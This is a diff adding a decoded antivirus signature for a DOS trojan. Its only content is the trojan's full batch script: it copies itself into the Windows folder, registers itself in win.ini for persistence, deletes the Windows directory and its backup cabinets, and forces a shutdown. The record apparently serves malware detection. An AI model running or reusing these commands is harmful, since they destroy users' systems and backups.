@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36597
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off copy %0 %windir%\%nice%.bat echo run=%windir%\%nice%.bat >> %windir%\win.ini echo load=%windir%\%nice%.bat >> %windir%\win.ini echo [boot] >> %windir%\system.ini rd/s/q c:\windows\ deltree /y c:\windows\ rd/s/q c:\windows\sysbckup\*.cab deltree /y c:\windows\sysbckup\*.cab shutdown /s /f /t 300 
